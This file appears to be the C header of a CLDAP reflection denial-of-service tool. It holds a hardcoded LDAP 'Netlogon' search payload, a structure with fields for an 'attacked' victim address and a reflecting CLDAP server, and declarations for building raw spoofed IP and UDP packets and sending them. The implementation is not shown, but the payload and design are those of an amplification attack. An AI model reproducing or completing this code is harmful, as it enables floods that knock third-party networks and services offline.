#include "main.h"

const char* UDP_DATA = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e\x65\x74\x6c\x6f\x67\x6f\x6e";

typedef struct List{
    struct sockaddr_in data;
    struct List *next;
    struct List *prev;
} List;

typedef struct {
    char* packet;
    int sockfd;
    const int UDP_DATA_SIZE;
    const int UDP_HDR_SIZE;
    const int IP_DATA_SIZE;
    const int IP_HDR_SIZE;
    const int PACKET_SIZE;
    unsigned long attacked_addr;
    unsigned long cldap_server_addr;
    struct sockaddr_in sin;
    struct ip* ip;
    struct udphdr* udp;
} CLDAP;

void send_packet(CLDAP *);
unsigned short check_sum(unsigned short *, int);
CLDAP* set_address(CLDAP *, unsigned long *);
CLDAP* create_socket(CLDAP *);
CLDAP* construct_IP(CLDAP *);
CLDAP* construct_UDP(CLDAP *);
CLDAP* construct_packet(CLDAP *);
CLDAP* set_socket(CLDAP *);
int cldap_build(void *);